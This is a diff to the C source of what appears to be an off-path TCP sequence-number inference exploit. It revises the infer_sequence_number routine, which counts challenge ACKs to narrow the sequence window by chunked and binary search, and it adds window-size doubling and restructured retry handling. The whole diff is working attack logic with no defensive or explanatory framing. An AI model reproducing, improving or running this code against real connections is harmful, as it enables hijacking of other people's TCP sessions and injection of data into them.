@@ -1091,14 +1091,47 @@ int infer_sequence_number(void)
 				pr_start, pr_end, pkts_sent, g_chack_cnt);
 
 		/* adjust the search based on the results and mode */
-		if (g_chack_cnt == 100) {
-			if (step == 0) {
+		if (step == 0) {
+			if (g_chack_cnt == 100) {
 				ci++;
 				if (ci == nchunks) {
 					printf("[!] Exhausted seq window search...\n");
 					return 0;
 				}
-			} else if (step == 1) {
+			} else if (g_chack_cnt < 100) {
+				/* figure out which chunk exactly! */
+				bs_start = sched[ci].start;
+				bs_end = sched[ci].end;
+				printf("[*] Narrowed sequence (1) to %lu - %lu!\n",
+						bs_start * g_ctx.winsz,
+						(bs_end * g_ctx.winsz) + g_ctx.winsz);
+
+				/* adjust winsz if g_chack_cnt < 99 */
+				if (g_chack_cnt < 99) {
+					u_long tmp, old;
+
+					old = g_ctx.winsz;
+					tmp = old * 2;
+					printf("[*] NOTE: Window size too conservative, doubling to %lu...\n", tmp);
+					g_ctx.winsz = tmp;
+
+					/* we need to fix the range to the new window size too */
+					bs_start = (bs_start * old) / tmp;
+					bs_end = (bs_end * old) / tmp;
+				}
+
+				/* reset the schedule */
+				free(sched);
+				sched = NULL;
+				nchunks = 0;
+
+				/* proceed to the next step */
+				step = 1;
+			} else {
+				fprintf(stderr, "[!] invalid challenge ACK count! retrying range...\n");
+			}
+		} else if (step == 1) {
+			if (g_chack_cnt == 100) {
 				if (bs_start >= bs_end) {
 					/* FAIL! */
 					printf("[!] Exhausted seq window binary search...\n");
@@ -1108,31 +1141,7 @@ int infer_sequence_number(void)
 					/* adjust range */
 					bs_end = bs_mid;
 				}
-			} else if (step == 2) {
-				ci++;
-				if (ci == nchunks) {
-					printf("[!] Exhausted sequence number search (1)...\n");
-					return 0;
-				}
-			} else if (step == 3) {
-			}
-		} else if (g_chack_cnt == 99) {
-			if (step == 0) {
-				/* figure out which chunk exactly! */
-				bs_start = sched[ci].start;
-				bs_end = sched[ci].end;
-				printf("[*] Narrowed sequence (1) to %lu - %lu!\n",
-						bs_start * g_ctx.winsz,
-						(bs_end * g_ctx.winsz) + g_ctx.winsz);
-
-				/* reset the schedule */
-				free(sched);
-				sched = NULL;
-				nchunks = 0;
-
-				/* proceed to the next step */
-				step = 1;
-			} else if (step == 1) {
+			} else if (g_chack_cnt == 99) {
 				/* if we only sent one guess this time, we won! */
 				if (pkts_sent == 1) {
 					u_long seq_block = bs_mid * g_ctx.winsz;
@@ -1153,25 +1162,28 @@ int infer_sequence_number(void)
 				else
 					/* adjust range */
 					bs_start = bs_mid;
-			} else if (step == 2) {
+			} else {
+				fprintf(stderr, "[!] invalid challenge ACK count! retrying range...\n");
+			}
+		} else if (step == 2) {
+			if (g_chack_cnt == 100) {
+				ci++;
+				if (ci == nchunks) {
+					printf("[!] Exhausted sequence number search (1)...\n");
+					return 0;
+				}
+			} else if (g_chack_cnt < 100) {
 				ci++;
 				if (ci == nchunks) {
 					printf("[!] Exhausted sequence number search (2)...\n");
 					return 0;
 				}
-			} else if (step == 3) {
 			}
 		}
-#if 0
-		// XXX: TODO: adjust winsz if g_chack_cnt < 99?
-		else if (g_chack_cnt < 99) {
-		}
-#endif
-		else {
-			// XXX: TODO: scale number of guesses per round based on feedback
-			fprintf(stderr, "[!] invalid challenge ACK count! retrying range...\n");
-		}
 
+#if 0
+		// XXX: TODO: scale number of guesses per round based on feedback
+#endif
 		g_chack_cnt = 0;
 	}
 
